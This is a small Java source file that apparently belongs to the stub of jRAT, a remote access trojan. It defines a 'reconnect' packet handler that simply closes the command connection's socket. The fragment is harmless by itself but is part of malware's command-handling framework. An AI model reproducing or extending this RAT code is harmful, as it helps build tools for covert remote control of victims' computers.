package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;

public class Packet45Reconnect extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.socket.close();
	}

}
